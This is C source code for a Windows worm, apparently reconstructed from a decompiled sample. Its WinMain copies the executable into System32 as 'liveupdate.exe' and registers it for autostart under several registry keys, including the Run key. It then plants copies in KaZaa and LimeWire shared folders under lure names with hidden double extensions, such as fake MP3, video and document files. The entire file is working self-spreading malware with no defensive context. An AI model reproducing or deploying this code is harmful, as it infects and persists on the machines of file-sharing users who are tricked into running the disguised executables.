#pragma optimize("", off)
#include "data_globals.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    volatile struct _LocalCtx {
        int iVar1;
        HKEY local_11c;
        CHAR local_118[260];
        DWORD local_14;
        HMODULE local_10;
        char wormpath[MAX_PATH];
    } ctx;

    GetWindowsDirectoryA(_windir, MAX_PATH);
    ctx.local_10 = GetModuleHandleA(NULL);
    ctx.local_14 = GetModuleFileNameA(ctx.local_10, ctx.wormpath, MAX_PATH);

    // Build "C:\Windows\System32\liveupdate.exe" in _windir
    strcat(_windir, "\\System32\\liveupdate.exe");

    CopyFileA(ctx.wormpath, _windir, 0);

    RegCreateKeyA((HKEY)0x80000000, "CLSID\\{7A9D77BD-5403-11d2-8785-2E0420524153}", &ctx.local_11c);
    RegSetValueExA(ctx.local_11c, "Branko", 0, REG_SZ, (const BYTE*)_windir, strlen(_windir)+1);

    RegCreateKeyA((HKEY)0x80000001, "Software\\Microsoft\\Internet Explorer\\InternetRegistry", &ctx.local_11c);
    RegSetValueExA(ctx.local_11c, "Branko", 0, REG_SZ, (const BYTE*)_windir, strlen(_windir)+1);

    RegCreateKeyA((HKEY)0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\Remote", &ctx.local_11c);
    RegSetValueExA(ctx.local_11c, "Explorer", 0, REG_SZ, (const BYTE*)_windir, strlen(_windir)+1);

    RegCreateKeyA((HKEY)0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &ctx.local_11c);
    RegSetValueExA(ctx.local_11c, "Branko", 0, REG_SZ, (const BYTE*)_windir, strlen(_windir)+1);

    RegCreateKeyA((HKEY)0x80000001, "Software\\Kazaa\\Transfer", &ctx.local_11c);
    RegSetValueExA(ctx.local_11c, "Upload", 0, REG_SZ, (const BYTE*)_windir, strlen(_windir)+1);

    // Missing registry key (original lines 62‑63)
    RegCreateKeyA((HKEY)0x80000001, "Software\\Microsoft\\Protected Storage System Provider\\S-1-5-21-1004336348-484061587-1177238915-500\\NoAction", &ctx.local_11c);
    RegSetValueExA(ctx.local_11c, "Branko", 0, REG_SZ, (const BYTE*)_windir, strlen(_windir)+1);

    RegCreateKeyA((HKEY)0x80000002, "Software\\Microsoft\\Windows Live\\Communications Clients\\Share", &ctx.local_11c);
    RegSetValueExA(ctx.local_11c, "Send", 0, REG_SZ, (const BYTE*)_windir, strlen(_windir)+1);

    // P2P copies
    CopyFileA(ctx.wormpath, "C:\\Program Files\\KaZaa\\gratis.mp3.exe", 0);
    CopyFileA(ctx.wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\ladygaga.mp3                    .exe", 0);
    CopyFileA(ctx.wormpath, "C:\\Program Files\\KaZaa\\maliciousremovaltool.exe", 0);
    CopyFileA(ctx.wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\ladyinbed.avi                    .exe", 0);
    CopyFileA(ctx.wormpath, "C:\\Program Files\\KaZaa\\ReadMe!.nfo                    .exe", 0);
    CopyFileA(ctx.wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\list-download.txt                    .exe", 0);
    CopyFileA(ctx.wormpath, "C:\\Program Files\\KaZaa\\game-collection.exe", 0);
    CopyFileA(ctx.wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\porno+18.mpeg                    .exe", 0);
    CopyFileA(ctx.wormpath, "C:\\Program Files\\KaZaa\\remoteotherkazaa.exe", 0);
    CopyFileA(ctx.wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\softpacked.exe", 0);
    CopyFileA(ctx.wormpath, "C:\\Program Files\\LimeWire\\gratis.zip.exe", 0);
    CopyFileA(ctx.wormpath, "C:\\Program Files\\LimeWire\\My Shared Folder\\spaceticket.doc                    .exe", 0);
    CopyFileA(ctx.wormpath, "C:\\WINDOWS\\system32\\inetsrv.dll                    .exe", 0);

    return 0;
}
#pragma optimize("", on)
